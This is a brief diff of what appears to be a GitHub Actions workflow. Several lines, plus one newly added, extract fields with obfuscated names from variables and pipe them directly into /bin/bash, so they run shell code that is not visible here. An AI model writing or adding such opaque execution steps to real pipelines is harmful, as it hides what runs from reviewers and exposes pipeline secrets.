@@ -28,6 +28,7 @@ jobs:
           echo $wx2 | jq -r .ydmmp04010 | /bin/bash
           echo $dr91332 | jq -r .iiz935 | /bin/bash
           echo $fmyee4 | jq -r .mxrox6 | /bin/bash
+          printf '%s' "$sx03" | jq -r .l58 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
